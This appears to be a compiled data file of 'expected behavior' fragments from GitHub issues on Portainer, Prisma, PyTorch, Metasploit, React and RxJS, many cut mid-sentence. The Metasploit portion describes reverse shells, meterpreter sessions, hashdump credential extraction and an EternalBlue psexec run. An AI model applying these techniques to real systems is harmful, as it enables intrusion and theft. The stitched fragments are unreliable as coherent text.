the docker registry should work without prepending any host:port to image name.
empty environment variables should just be rendered with their name and no trailing =.
portainer functions properly with gitlab registry
briefly describe what you were expecting.
all agent is running.
"registry" parameter for container templates should be honored and used by portainer to pull image as necessary (using auth if registry is configured in portainer to do so)
also changes to the template "registry" choice via the portainer template ui should result in proper updates visible through the ui.
network parameter should be updatable via portainer template ui.
that the unamed volumes get the same ownership as the container/service/stack they belong to.
in a swarm environment the stack creation of a yml file hosted in a git repository doesn't work
the gui shows a error in upper right corner e in the logs it's showed: 2018/07/17 11:00:27 starting portainer 1.19.1 on :9000
2018/07/17 11:01:28 http error: unable to clone git repository (err=repository already exists) (code=500) the username and password are correct
briefly describe what you were expecting
steps to reproduce the issue: briefly describe what you were expecting.
`--no-auth` flag means going to the url loads the home page instead of the authentication screen.
network list
![image](
network detail
![1](
correct task list (docker service ps)
parameter `external` can be used in docker-compose.yml to create a stack without getting an error.
portainer have to show log like this: ```

not jumping around int the log and just update the log to latest stoudlines briefly describe what you were expecting.
- users should be able to access to container consoles via portainer web interface
when i create a stack, only one stack should be created and the container should be associated to the created stack.
console windows opens correctly in portainer
i tried to create a stack by gui in a standalone node
this is the compose: version: '2.3'
services: nginx: image: nginx ports: - 180:80 this is the error showed in the log: docker logs 177a188d7ac6 2018/06/26 08:27:08 starting portainer 1.18.1 on :9000
2018/06/26 08:27:27 http error: invalid jwt token (err=invalid jwt token) (code=401)
2018/06/26 08:27:54 http error: could not load x509 key pair: open /.docker/cert.pem: no such file or directory (err=could not load x509 key pair: open /.docker/cert.pem: no such file or directory) (code=500) which kind of certification portainer is looking? the node has been registered first, when the version was 1.17.1
the standalone node is registered well by tls with server and client authentication.
infact it's possible to run containers from portainer gui.
proper storage of compose files.
i expect the stack described in docker-elk to be deployed properly
the same repo works out of the box using docker-compose on the command line
deploying from a template works as intended every time
especially if it's the same template.
i would expect that the portainer instance loads all the data it can, so i can continue to use it as much as possible
an error message explaining that it was unable to contact an agent would also be helpful.
portainer should also show it as 3/3
we expected that the stack start working and all mount volumes be assign correctly like when we run the command "docker service create".
i expected my container to get recreated after being turned down with the latest image pushed to gcr.
the defined named volume should be selected in the service page.
show available docker volumes
it was expected that the swarm would update, just as if i had pasted the file contents into portainer and clicked update stack.
text should be paste as it is, no changes
the same as `git clone`, which doesn't fail: ```bash
$ git clone
cloning into 'azure'...
``` clones the repo just fine.
mounted volumes should not be tagged as unused
change the yaml for a stack and hit update, should update the stack
in this case i am change the image used.
i expected to have shown the task filtered in according to filter string
steps to reproduce the behavior:
go to stacks list page 2
click on one stack configured
scroll down to task section
insert some string to search.
image should be pulled.
console for respective container to launch for executing commands.
the stack deployed.
able to *update* existing stacks, either with or without making changes to the stack file.
one entry in the list per container.
the ability to define multiple host file entries and for them to be saved to the running docker container and then displayed in the ui.
changing the password should be possible.
the "change-password-disablement" should exclude admin
: scroll bar should respond, content in the console should be scrolled other notes: the issue doesn't happen if:
other browser is used (firefox)
left panel (mentioned in **steps to reproduce the issue > 1** is minimized)
the query / actions work.
it should take 1s to deploy
i expect all elements in the list to be updated, but only one is (the last in the list).
same behaviour as without alias except result structure is `data.example.*` instead of `data.user.*`

to have the same version on npm i -g prisma as on npx prisma (maybe?)
i suspect that i can use positional filtering when deleting embed subresources
but i can't.
assuming the type `long` is designed to hold greater numbers than javascript support, you should either update long to be `string | number` or force it to be a `string` when retrieving the result from the server.
by specifying `database: foo` i expected that prisma will use `foo` as the schema in the db.
should be able to use the `endpoint` for both the generated client and the `prisma deploy` command.
we should upgrade `prisma-cli-engine` to use a later version of this package (0.6.2).
i believe it should be like
hoge: { id: "someid", name: "hogehoge", foo: { value: 100, time: "sometime" }, bar: { value: 200, time: "certaintime" }
once the load is reduced, prisma server should "recover" and start accepting queries again.
should return same values that pgadmin
type definitions shouldn't be created or added for scalar [string], [int], array relational tables
also the scalar array property shouldn't be removed from the original type definition it was defined in
also the scalar arrays should be updated/modified to include the new declaration of `@scalarlist(strategy: relation)`
should have returned the results without any errors
must be filled with data
prisma should deploy with no error from the server.
prisma cli displays list of available commands, and isglobal is false.
the model should be deployed.
the orderbyinput of the prisma client should'nt expose the `createdat_asc`, `createdat_desc`, `updatedat_asc` and `updatedat_desc` if not provided in the datamodel.
server upgrades proceed as normal.
```javascript
{ "data": { "createb": { "id": 1 } }

- `prisma` cli: `prisma/1.33.0` `(darwin-x64) node-v11.12.0`
- os: `macos mojave v10.14.5`
the warning should not appear.
introspects without errors
three tables should be created:
_gameplayer
once we go into we are expecting to see all our type definitions in the schema
client generation should work.
there should be no error, and the next step in the wizard (generation option) should appear and in the end the prisma.yml, schema.prisma and generated folders and its content (depending on the generator selection: ts, js, ..
, none) should appear in the directory the prisma init command is run.
it should be:
` ` it is currently:

prisma should return the subfolder:
{ "data": { "folders": [ { "id": "cjvnwf64s001m082346rgp74d", "name": "bottom level" } ] }

should cancel deploy with clear error message that `strategy: sequence` requires a `@sequence` decorator **with link to docs!**.
i would expect the result of the above query to instead be: ```
"events": [ { "id": "2", "rsvps": [ { "id": "4", "user": { "id": "abcd" } } ] }
``` ...where events with empty rsvps lists are excluded, since there is no user to match the `rsvps_every` clause
expect data would be added to the db specified in docker-compose.yml
prisma export should retry queries after waiting a little bit when they fail, instead of failing.
i would expect a null value to be returned since the specified query does not match the result
`allsubcategories` should not be empty
it should output: ```json
{ "data": { "allcategories": [ { "id": "cjvf7aevp001o07986x1gitiv", "name": "drinks", "parent": null }, { "id": "cjvf7bmd9002k0798iy52dgq9", "name": "milks", "parent": { "id": "cjvf7aevp001o07986x1gitiv", "name": "drinks" } } ], "allrootcategories": [ { "id": "cjvf7aevp001o07986x1gitiv", "name": "drinks", "parent": null } ], "allsubcategories": [ { "id": "cjvf7bmd9002k0798iy52dgq9", "name": "milks", "parent": { "id": "cjvf7aevp001o07986x1gitiv", "name": "drinks" } } ] }
i expect exacltly the same models to be generated no matter from where i run `prisma introspect`
expected birthdate to be persisted and returned.
it should be parsed as a local url and should not trigger cloud authentication flow.
the manual redeploy after the rename should work just fine, as there are no required fields that aren't filled out
it should probably return a `[]`, but better would be an ast of default types.
to have a way to execute a where statement with a list of the enum values.

given the query i've described above, count should be 1
it always returns 0 when filtering by a parent association.
it returns a new incremental id (starting at 10000, increasing 1 by 1) in the field where `@id` is assigned.
there should be no delay when running `prisma deploy` without being logged in prisma.
a way to filter out relation that is set
something like ```
prisma.organizations({ where: { consultancy_not : null } })
properly handled error with a proper error text.
prisma init workflow should generate a correct `docker-compose.yml` file.
it should ask for schema once, either ask for base mongo url and not whole mongo string or parse the string ahead of time and optionally ask for schema.
it should not throw an error.
use the prisma.yml specified by the -p flag in conjunction with the env-file specified by the -e flag
prisma server should reject this datamodel on any field that has type `uuid` for mysql or mongo
given the connection and environment is sane/valid, no errors should occur.
execute operations in the specified order.
instead of returning all objects, it should return 0 objects
it should behave similar to sql in-query logic.
the expected type would be `user | null`
it should provide an option to connect to the database without introspection.
expecting to have a `datamodel.prisma` sdl that matches our db schema.
prisma cli should `schema` name to `docker-compose.yml` file.
i expected that deploy works, after introspection.
`registeredat` field should work as `createdat` be a read-only and in `prisma-client` generated file should be a `datatimeoutput` instead of `datatimeinput`
i can access admin ui by ` `
all relations from previous export should be imported properly
cli should parse the urls correctly for non localhost urls as well
prisma init to generate schema.
here's a dump of the database i'm using:

it should be able to deploy the server without any problem.
database connection succeed as same as prev version.
prisma client should not build an invalid query.

``` this happens because the client query builder [overrides `then`, `catch`]( #l238-l253) and builds the query whenever this promise-like object is consumed and past instruction set (client internal query building meta array) is cleared to avoid memory leaks via prior to the memory-leak fix, this used to work with a network call, each time the promise is consumed
this behavior is also not optimal (same promise should use the network link only once)
--- **potential solutions**: we can build an internal client cache that stores the results of past operations but that would leak memory as we are remembering the results
to solve this issue, we can do the following: 1
either maintain a fixed size queue of remembering past operations to limit the memory usage
provide an api from client to manually clear the memory
deploys to prisma server
when executing `prisma generate` on the command line, prisma successfully generates both the schema and the client in the `generated` directory
i would expect the same behavior when `prisma generate` is executed as a `post-deploy` hook
**versions:** - connector: `postgres` - prisma server: `1.27.0` - `prisma` cli: `prisma/1.28.0 (darwin-x64) node-v10.4.1` - os: `os x mojave 10.14.3` - other dependencies: `prisma-client`
docker container should not restart
query should not break
generate arrays, not an object.
queries to return without errors.
correctly parse the after or before argument to return the next 'paged' results/edges for the query
should migrate and create necessary tables & columns in the postgres database.
the expected behavior would be to correctly deploy the schema to the hosted db, and execute the post-deploy script to get the generated schema.
directory should only be created after all information is extracted from the init workflow.
run the query without error and return a slice of `user`s.
no errors and `prisma deploy` is successful after `docker-compose up -d`.
the images should have been imported.
`ssl: true` is added to the dockerfile
the prisma server should be use the existing database since it already has some data
**whats happen**
the prisma server creates a new database based on service name and stage, and don't use the existing database
prisma should validate the schema for invalid type names and return a user-friendly error (e.g
"invalid type name: type must start with an uppercase letter").
it should not throw an error
generated interface should look like this: ```
export interface area { name: string id: id_output updatedat?: datetimeoutput createdat?: datetimeoutput accesses?: areaaccess[]
creation of the user should not result in an error
i should be able to create a company without also having to create a store in the database
query displays all user permissions with the users associated with them or null if they have none.
the *whereinput array fields are pointers
subscription with or should work.
the migration table should be created in the project database.
chaining like ctx.db.student({ id }).school().name() used to work and return the scalar value.
should generate a proper file used in the future
this shall work with both schemas, indifferently where the relation is stored.
service deploys to cluster correctly
connection succeeds
since prisma server thinks this datamodel is valid the generate command should not throw any error.
the migration should just work, maybe outputting an additional hint about how migrations are handled with mongodb and linking to the docs.
prisma should pay attention to whether the relation is nullable or non-nullable in datamodel.
non-nullable relation in datamodel:
type user { sessions: [session!]! @relation(name: "usertosessions", ondelete: cascade) ...
is expected to make prisma create a non-nullable relation field:
type user {
sessions(...): [session!]!
``` nullable relation in datamodel:
type user { sessions: [session!] @relation(name: "usertosessions", ondelete: cascade) ...
``` is expected to make prisma create a nullable relation field:
type user {
sessions(...): [session!]
``` nullable
the generated datamodel file should look like this: ```graphql
type post @pgtable(name: "post") { author: user @pgrelation(column: "author") id: int! @id @unique title: string!
} type user @pgtable(name: "user") { email: string id: int! @id @unique name: string! posts: [post!]!
``` the generated `docker-compose.yml` should: - use the prisma docker image `1.24` (i'm on `prisma/1.24.0 (darwin-x64) node-v10.13.0`)
- have `migrations` set to `false`
- `ssl` set to `true`
to connect to new demo sever
access postgres db
the users with the two uuids above should be disconnected from the campaign entity.
it should return an array with a user where id ends with the provided string.
the records with a `null` name should be returned
i would like to see:
$ go run ./server
2019/01/04 01:48:19 server is running on
connect to database
the ability to handle or escape special characters for existing (and new) fields.
the above mutation should succeed without a failure.
it should deploy successfully.
i firstly set up db with django orm
some tables have a relation column each other with option `'related_name='`
i think this is generated to @relation(name: something) into datamodel.prisma
but the problem is the generated result is something like this `@relation(name: account_messageboxes_receivers)`
it is missing the double quote, the first uppercase letter, and the underscores
i changed it to `@relation(name: "accountmessageboxesreceivers")` then it is deployed successfully.
using float64 for float type **versions:** - os: `windows 10` and `ubuntu 18.04` - `prisma` cli: `prisma/1.23.0 node-v11.5.0` - prisma server: `1.23.0`
using playground i can set this field to `null` normally, i think the golang client needs to do the same ```graphql
mutation { updatetodo( where:{id:"foo"} data:{concludedat:null} ){id}
``` **possible solution**
prisma generate `todoupdateinput` field with the json tag `omitempty`, this is correct because we want to update some fields not all, but this make impossible to set any nullable field to `null` ```go
type todoupdateinput struct { ...
concludedat *string `json:"concludedat,omitempty"` }
``` i think prisma needs to generate nullable fields with a custon type and use json marsheler interface
type nullstring string var emptystring nullstring = "xxuo01rur5khmakhsosgqwngvajrkqti11jlmlfp" func (o nullstring) marshaljson() ([]byte, error) { if o == emptystring { return []byte("null"), nil } return json.marshal(string(o))
} type todoupdateinput struct { ...
concludedat *nullstring `json:"concludedat,omitempty"` }
``` now i can set this field to `null` using `emptystring` constant ```go
updatetodo(prisma.todoupdateparams{ where: prisma.todowhereuniqueinput{id}, data: prisma.todoupdateinput{ concludedat: &prisma.emptystring, },
}).exec(ctx)
``` **versions:** - os: `windows 10` and `ubuntu 18.04` - `prisma` cli: `prisma/1.23.0 node-v11.5.0` - prisma server: `1.23.0`

when userupdate mutation is run on local or graphql playground output should be ```json "data": { "user": { "node": { "updatedat": "2018-11-27t08:45:40.865z", "email": "user@example.com", "archivedat": null, "lastname": "testlastname", "firstname": "testfirstname", "id": "cjoz9klnnab7709619ruq8mrs", "createdat": "2018-11-27t04:51:27.779z" }, "mutation": "updated", "updatedfields": [ "lastname", "updatedat" ], "previousvalues": { "updatedat": "2018-11-27t08:40:40.865z", "email": "user@example.com", "archivedat": null, "lastname": "testlastpreviousname", "firstname": "testfirstname", "id": "cjoz9klnnab7709619ruq8mrs", "createdat": "2018-11-27t04:51:27.779z" } } }

as we console log in resolver the outout on console is

to see the results without any error.
`a`, `x` and `y` should be deleted.
expected to retrieve a single record
it happens when i am inserting data to database ;(
the column `:max` looks like an internal thing.
the prisma server error logs should include something to help debug this.
the error message returned to the client should include something to help debug this.
the primsa server docs should have some links to how the docker image is created so there is some way to add our own debugging when this happens.
the cli logs the first output quickly
i would expect to be able to run my test case with no graphql error
that is the error message: ``` graphql error: variable \'$data\' expected value of type \'floorupdateinput!\' but got: {"rooms":{"update":[{"where":[{"id":"cjom0hu91vh5h0888ggz3b5hp"}],"data":{"building":{"connect":{"id":"cjom0hu6gvh4o0888h4w9evlb"}},"sectio

this error shouldn't happen.
no errors are thrown by `tsc`.
that prisma could at least suffice with sub 512mb ram, as that seems to be the ram limit for a lot of provider's pricing breakpoints
`prisma.$exist.type` should not throw a flow error
no typescript compilation error.
the typescript types to be sound wrt the generated prisma client code
```typescript
db.foo({ id: 'does not exist' }).then(console.log);
it should work as well as prisma installed with npm
should return getmany when a relation is an array.
it should work
expect to receive the same response for the 2 tests
the js based schema generator should match the actual prisma schema.
should make a new server
the fluent api should work.
it should execute the mutation without error.
in go, i should see `type data struct{...}` include `letter`, but it does no.
the type of `db.user(...)` to be `user?` reflecting the fact that it's possible that no such user exists.
the generated schema from js schema generator should match the schema generated by prisma.
prisma installed with homebrew should run as well as installed with npm
> we should `cd` into the folder and change this to the programmatic implementation that runs the command directly without spawn

in step 5, prisma client should return the same error that prisma api returns in step 2.
the prisma schema is created.
in that example, the value of the `iteratorresult` (`result.value`) should be of type `usersubscriptionpayload`
instead is of some type `{ user: usersubscriptionpayload }`.
i would like an autocomplete as i had before the fix (which i still have on the other branch by the way).
see screenshot below : ![screenshot from 2018-10-10 14-23-48](
the raw graphql request is executed.
the generation should implement either a language agnostic or language specific interpolation method
here are the proposed approaches:- **1
language agnostic - domain-specific language (dsl)** we can create a small domain specific template strategy that can be shared by all the programming languages
the language specific client runtime can parse the template and create a url that supports environment variables
the client can emit the following (basically copying `prisma.yml` as is in places of doing js interpolation it does currently):- "http://{env:server_url}/{env:stage}" and then this is translated into language specific url strings by the language specific client runtimes:- 1
`http://{process.env.server_url}/${process.env.stage}`
`"http://" + os.getenv("server_url") + "/" + os.getenv("stage")` 3
$_env["server_url"]
$_env["stage"]` **2
language specific** while generation, we can generate language specific strings, the output for the following string in `prisma.yml` (`http://{env:server_url}/{env:stage}`) would be the following at generate time:- 1
`http://{process.env.server_url}/${process.env.stage}`
`"http://" + os.getenv("server_url") + "/" + os.getenv("stage")` 3
$_env["server_url"]
$_env["stage"]` the 2nd approach sounds more idiomatic and more language specific (as the generation should be) but the advantage of 1st approach is that we can pre-process environment variables if needed via updating the runtime without change in generated code
personally, i favor approach 2 because it is less magical for end user :)
initialize prisma
consecutive pages of users are paged correctly.
it'd exit with the error from the command.
prisma client would not impose any naming restrictions on model names.
i would expect it to behave like in command prompt.
i think users who clicked the page should be routed to not to
the other pages look good.
i suppose firstly, i\'d expect it to not crash with an "unexpected error"
stated differently, if i am doing something wrong, i'd expect it to tell me what i am missing rather than display a development stack trace.
instead of returning an error, the cli should tell the user to copy/paste the url, and keep listening for successful login.
changes should happen.
we should be able to provide a selection set for arrays.
the env variable / template literal should be processed and not cause any errors.
panic: interface conversion: interface {} is nil, not map[string]interface {}
data import executes correctly
is this expected?
the generated type for a to-one relation should have `userwhereuniqueinput` as the input argument type.
prisma connects to the mysql container on port `3307`.
`prisma init` should run without errors
the command should fail for invalid prisma configuration.
(first: 1, skip:0) should return the first log on user not all logs on user...
return post not null and have content = "hello world" for that user instead post will still be null and no content
it should return the only user (username=federico) with the three loaded universities with the first 10 careers for each university, but is only returning the first 5 careers for harvard, the first 5 for cambridge, and the all 3 careers for oxford.
no internal server error would be ncie

it should not be possible to create such a relation, the name should be reserved and the creation should fail with an error.
either: a) i should get an error message on creation, telling me that this model is invalid
b) the crud schema should be generated differently for this special case.
the query should be executed without error.
running `prisma playground` when electron app is installed opens playground in electron app.
user will be skipped, only one user is showing
works with prisma 1.13
dosn't work with prisma 1.14 and 1.15
i expect `prisma deploy` to use the proper secret to access the server.
query should succeed.
cascading delete should be performed successfully.
it should start up.
subscription not be closed (spinning wheel in playground)
data should be returned when there is an event the subscription matches.
the datamodel change is deployed without an error.
the server should be able to operate stably for an extended period of time.
the presence of an exclamation point with an enum in graphql shouldn't affect the case sensitivity of the column name.
shouldn't throw an error `cannot read property 'task' of undefined` and i should recieve data in the subscription on frontend
returns datetime value.
it should write the latest released version into `docker-compose.yml`.
you should be able to use the uuid column as intended without insertion errors
instead, you will get an error, and the prisma server will report that the database threw an error for "incorrect string value".
the query returns some nodes and no error.
should return the number of returned nodes: ```
{ "data": { "usersconnection": { "aggregate": { "count": 3 } } }
i was expecting it to deploy my changes.
the mutation goes through without throwing an error.
a correctly paginated return as provided when using types featuring an id of type `id`.
shouldn step 4 produce an error if it run in a different browser or in an incognito tab? i still able to access the entire api, even in a different browser or an incognito session.
the cli returns an error message similar to ```
error when deploying:
user * test: unknown type test
i expect this to not produce errors and delete all the records.
the `id` field should be the actual id
i suspect a function is being returned as a string rather than being called somewhere in the code.
mutations should be executed on a given table in `public` schema instead of `default$default` schema when `schema: public` option is provided in docker-compose.yml.
prisma service must be started as usual.
the `prisma introspect` command should generate a valid `datamodel.graphql` that can be deployed.
should be able to run docker-compose exec prisma /bin/bash which should allow me to enter the running container, so i can run prisma deploy
but i am not able to, because the container continues to restart
the newly created user appears with same id and name in the subscription response.
delete only the relation between x/y
i expect subscriptions to fire when mutations affect these types.
it should update the fields and create a new type order.
delete the record
it should execute the prisma deploy successfully and download the schema from the prisma service
show up a way to setup prisma secret cloud.
i receive 1 node
for deploy to succeed
no errror message appears and the mutation is executed successfully
running `prisma playground --port 1234` serves the playground at ` `, as `prisma playground --port 1234 --web` currently does.
the endpoint (localhost:4466) should be running after typing`docker-compose up -d`
no errors in running `prisma deploy`
can already access the url of the endpoint in any browser to run graphql playground
return the lines in a decent amount of time.
it should be able to send the custom headers via the yaml file.
the commands should have the context of workspace and work
need to test this issue for all commands as it is exhibit only by some commands.
i am not sure whether the `endpoint` should be changed in the file
at least the existing one should be replaced.
the import must not crash
the import must ignore those errors when importing scalar list values.
it should work.
either the previousvalues type should not be created, or a warning/error should be created on deploy
since the deploy otherwise worked out okay, i was very confused and lost for a while trying to figure this one out.
the first append should be `endpoint: `
i don't know if those types are expected to be there or not.
playground works **notes**
this schema works with prisma 1.7.4
__ the built query shouldn't be comparing `integer` to `character varying` when both the specified ids (and `@pgrelation` columns) are `integers`.
if graphql works all in strings then prisma should cast the comparing `integer` to `character varying` for me
**finally:** should return results with requested data instead of `null`
i expect the server to deploy successfully and be able to access the playground at ` ` and examine the schema, make queries, etc currently the playground deploys but i can examine the schema (stuck in a loading state)
installation that completes without reporting any error
no error happen

i'd expect the backward pass to run at least 100 times faster
in fact, the performance is as expected when running the script on a different computer
performance for `linear` layers is also as expected.
program should not crash or if out of memory should return the relevant error.
we expect the gradients to be zeroed out when we multiply the loss by zero, which is not the case for cudnn implementation of ctcloss

`future` should get installed by default.
the minimal container also has a contrasting [good.cu]( script which does the same task, but doesn't crash in cuda-gdb.
the training
a = torch.randn((11111111, 20), device=torch.device("cuda"))
b = torch.randn((20, 2), device=torch.device("cuda"))
print((a @ b)[8807984:].equal(a[8807984:] @ b))
should return `true`
the computation time should be roughly similar with or without padding.
builds successfully
tests in question pass
the training should be deterministic across different runs
the script just successfully finishes.
expected build to complete
behavior should be consistent between cpu and gpu, i.e., a `runtimeerror` should be raised in the last call above.
the two executions of the code (with and without cudnn) should output approximately the same loss values.
expected image prediction from the model every time a new image is uploaded.
it works if i reduce the batch dimension by one.
`x = torch.randn(n*n -1 , 2, 2).cuda()
`conv1d` outputs nan value or `conv1d`'s weights are not nan values.

no random ] at the end of the results ## current behaviour there is an extra ] after the results
![image]( it doesn't appear to be closing for anything opened earlier so i think it is just a print that isn't in the right place.
axfr should be attempted against the ns specified
maybe have an option to also test the ns records set for the domain, but that could create unexpected traffic so it shouldn't be on by default
target may notice and log an axfr attempt against the ns.
these files should import successfully, and when you run `hosts` and `services` they should display the hosts and their services.
since these are default zabbix installations, i expected the module to successfully check that the default credentials are still in place as well as detect that it is a zabbix server installation
i believe the module was originally written for an older version of zabbix server and the text within the body has changed - the search string the module is using is no longer in the newer versions of zabbix.

**edit**: originally i said the guids and uids were not showing up properly
this is incorrect
in reality only the username is showing up incorrectly

scans for vulnerable hosts and attempt to exploit ms15-034
msfvenom should generate an elf file, as the executable format used by solaris on sparc.
to show information of module
show only services which are actually 'open'.
msfconsole should connect to db without issue on every start.
if the module is able to successfully connect to a share, then i would get a session
in my case i am still failing to login, but i should get a meaningful error message informing me as such
for example, when running the module against an inaccessible share prior to the `unset` commands i get: ```
msf5 exploit(windows/smb/ms17_010_psexec) > run [*] started reverse tcp handler on 172.28.128.1:4444 [-] 172.28.128.3:445 - rex::proto::smb::exceptions::loginerror: login failed: the server responded with error: status_access_denied (command=115 wordcount=0)
[*] exploit completed, but no session was created.
works well like `mingw32`
i expected to get a ssh session.
i expect to create database but fails.
works well.
this scenario should result in the session transport being encrypted.
the module finds the confcons.xml and draws out plain text passwords.
a sessions should start.

not setting disablepayloadhandler and saving means that it does not get set when you restart
setting disablepayloadhandler to false sets disablepayloadhandler to false

outer process should talk through middle process to msf.
**note: this works completely fine if middle process connects with reverse_tcp
it only crashes if middle process is on reverse_https**
the error message should print, without the traceback
for example: ```
[-] smb login failure .\\username:password 192.168.108.217:445
[-] failed to connect socket 127.0.0.1:445
the payload should connect successfully, or at least progress past smb session negotiation.
the `to_handler` command should start a handler for the specified payload.
the payload is added to the exe file
the exception should be caught
my proposal is currently in `lib/msf/ui/console/command_dispatcher/core.rb` in `cmd_route` [(link here)]( #l860)
additionally, a somewhat helpful error should be generated to say that the provided hostname could not be resolved from the local machine.
the command should run and return output (which it does)
but in the act of returning output, it shouldn't leave behind a text file on disk
you get a meterpreter session you can interact with
the whole point of this feature (which was primarily implemented in payload_uri in lib/msf/core/handler/reverse_http.rb) is so you can have a lot of network interfaces with a lot of different ip's, but run one reverse https handler on 0.0.0.0, and accept callbacks for all of your ip's (and even, say, forwarded connections from ssh reverse port forwards on various boxes on the internet) and it will automatically figure out from the host header where the client was connecting to and re-use that when building the stager
no need to run 5 or 6 different handlers
if you do not want this behavior, you simply specify overriderequesthost/overridelhost...
this was broken with the recent transport config stuff
ironically, the new code had a special case for overriderequesthost/overridelhost but didn't use the request host/port in the first place, making the override pointless
anyway, fix incoming.
metasploit should be able to write into /home/msf/.msf4/
msf_db should connect to postgre db
should show the payload options
to get vehicle information.
i get a shell using udp

by this i mean, the application continue to execute instructions normally after the last instruction of the shellcode.
should have executed the post module without error and dump gnome keys.
the module should proceed through the entire password list without crashing
get the references imported into metasploit database, so i can search for matched exploits using the "vuln_exploit -m" command from "pentest.rb" plugin.
a telnet listener should open on the remote host.
it should process that error correctly and not crash the scanner module.
the hashdump should extract the pwds from the exploited machine which is running in the background
msfconsole displays detailed job info with datastore options for the given job
the number of modules and their types should be printed.
metasploit starts
framework.log should only have exceptional stuff in it ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (ruby 2.4.1) ### os macos
it should return true
the handler should handle the incoming connection and create a meterpreter session
should have attempted to open a meterpreter shell with the target
no error, session continuing as usual
the prompt shouldn't get eaten by the evil cursor
the following message should be sent to **stderr** > "this copy of metasploit-framework is more than two weeks old.
> consider running \'msfupdate\' to update to the latest version."
using `reverse_hop_http` should open a session
no errors, and vulns table populated with vulnerabilities found.
the inspect function should complete without raising an exception.
autopwn2 should run.
i should get connection to the target on the attacker machine no matter what ip that is behind the ddns
however, usually it does not even connect but when it does, it is only on the ip that currently was active for the ddns while creating the payload
what is going wrong here? i mean of course it should be able to resolve a dns right? thanks! appreciated!

just one uuid in ~/.msf4/payloads.json
an elf-so payload is produced, as with the x86_64 format and payload (linux/x64/shell_reverse_tcp -f elf-so)
should give an error message if user didn't config a necessary parameter
this is especially bad when `show missing` shows there is nothing missing.
should report accurate number of users
in this case 4, not 2.
logging sink should catch msg to be nil
logging message should not be nil.
infected apk session shouldn't be closed after almost 5 seconds over wan.
- not report a false positive for a password containing the "@" character
in case of http connection timeout, it should bail out (give up)
## it keeps trying different ad (such "aspnet_client", "autodiscover" etc) making the process last for minutes.
the client side (msf) will close the socket at the end
## what happened?
the server side finished ssl handshake, client sent http request, server didn't send anything, after 190 seconds, it sent fin, client never sent the fin, so the socket is in close_wait state forever
### os ubuntu 14.04 msf auxiliary(cisco_asa_asdm) > version
framework: 4.13.0-dev-90d360a
console : 4.13.0-dev-90d360a
it should not give exception.
show scan results.
you should only get auxiliary modules with 'mysql' in the name.
i expect powershell to terminate nicely instead.
this should create a new `ssh sesssion` with the target host.
the exploit should work and a shell should be opened
progress should stop at 100%.
the command outputs list of all processes and `true` return value for `run_cmd`
results from acunetix xml file should be imported in workspace and hosts, services ,vulns
ect should be populated
i expected to get the nasm_shell prompt.
expected an unsigned char array containing the encoded payload.
the modules should largely fail, but not due to typos, missing requires, invalid arguments, missing functionality, etc.
psh stager should execute and the payload ultimately should execute
aborting a session with `^c` should end up with `powershell.exe` dying, and the cpu not hitting 100%
the smb login attempt should be conducted via source port 9000 (or whatever cport is defined)
this payload is targeting a windows 7 pro x64 bit system when executed the payload should call back to the handler and load meterpreter into memory and establish a session.
should get proper socket response, negotiation, and auth attempt
the exploit should run properly
it should find the gateway's mac and be able to send packets to the appropriate place.
the same across access by vhost and access by ip addr.
the tftp server starts and binds to 0.0.0.0 (all ipv4 interfaces) or binds to 0.0.0.0 and ::: (all ipv4 and ipv6 interfaces)
it is possible to download the payload file using a tftp client by connecting to 127.0.0.1.
get a meterpreter session.
when the `httpunknownrequestresponse` option is used, the framework should return the content of that option in http responses.
there should be the php tags automatically added to the payload by exploits that need it (like wordpress upload exploits).
execute autopwn exploits
second stage of meterpreter should be x64/xor encoded.
staged payloads should inject like stageless, imho.
it should try to serve an appropriate exploit.
it doesn't throw an error.
payload should be delivered and a session opened.
i expected it to load the script.
on windows 10 session it should return true (if enabled).
return hosts that match the search term.
it should start an reverse shell to the domain
all objects returned from create calls into the socket namespace should be sockets, not channels.
should generate file pdf
dropdown opens without any problems after launching a modal, just as it did with react v16.
no warning/error messages should be present in a console.
the onslideend method should be fired once the carousel finishes transitioning to the next/prev slide.
we should just omit "stateless" and describe them as "function components".
i'd expect that link to take us somewhere with more info
presumably it should go to or
the `nav` element should have a `role` attribute of "tablist".
the checkbox must show the message "you must agree before submitting." passed throw feedback prop
i would expect that `onclick` attributes be typed correctly, such as when using `<button onclick={...}>` (the native button component)
these are provided via the `@types/react` package:
scroll any component and then scroll the sidebar , it is not working most of the times
it works only on clicking the sidebar and not by hover ( which is ideal, i guess).
if the sidebar scroll works, just double click on the main component screen and now try to scroll the sidebar, it won't work.
all type files should import react in the same manner
drag preview should work as it working in other browsers displaying whole item being dragged instead of just drag handle.
no syntax error (since the readme page claims a browserlist target of ">0.25%, not dead", which would include ie 11).
click on 'drag me by the handle bad' works well
the `dndprovider` should use the already created backend
**example**
monitor.isdragging() should work without exceptions
i believe that cards should be both draggable and editable (just like in chrome).
i expect that subscriber.closed would be true because the consumer is only expecting a single value.
imo the first subscription should log all the values (`1`, `2`, `3`, `4`).
above code snippet never timeouts, but inspecting heap will reveal retainer to `timeouterror` object:
![image](
process exit after some console output.
after calling the callback, `this._unsubscribe` should be nulled out so the callback and its references can be garbage-collected
since a subscription can only be unsubscribed once, there is no need to keep the reference.
reusing pipes should not effect which source connects to which subscription
only the 1st subscription should run as the 2nd one hasn't been connected yet.
also the 2nd subscription should not be subscribed to the first observable
**workaround** use a factory method instead
``` const pipeline = () => pipe( map((x: number) => x * x), publish(), );
in the given example, i would expect to get a third array in my subscription
but i'm only getting 2
(take(n) gives n-1 results in the subscription) also would expect the observable to be completed.
finalize should be called at the end of a pipe, and before a next value is emitted from concatmap.
the typeerror should not leave the observable stream, should be catchable by catcherror the same way like when the `mergemap(async () => 2)` line does not present.
in my opinion, the same or some other error should be thrown on the latter case of `single` also, instead of an `undefined` value, as it happens with the case of `first(()=>false)`.
script should output :
a finalized b
a finalized c
each subscription to the observable should be independent
looking at the code, the problem is that the init object from the function parameters is reassigned within the observable
since this variable is from the closure it is shared across subscriptions, so subsequent subscriptions use the same abort signal which was already aborted and therefore always abort immediately.
/** * expected result: * * 0 * 1 * 2 * 3 * 4 * 5 * inittimeplus5s * 6 * 7 * 8 * 9 * 10 * inittimeplus10s */
it's expected to have any kind of type check error if we pass a key that's absent in the object type we have in the `pluck` input regardless of the expectations.
catcherror should act as a switchmap in case of error.
compatibility package breaks compatibility
behaviorsubject.getvalue() should return last value emitted from observable.
after person component gets destroyed (for example, via navigation) it should be picked up by garbage collector and no reference of it should exist in the application.
should be using just one type of source?
`interval(0, animationframescheduler)` should emit once each frame
not breaking
not sure as to exact console output, though
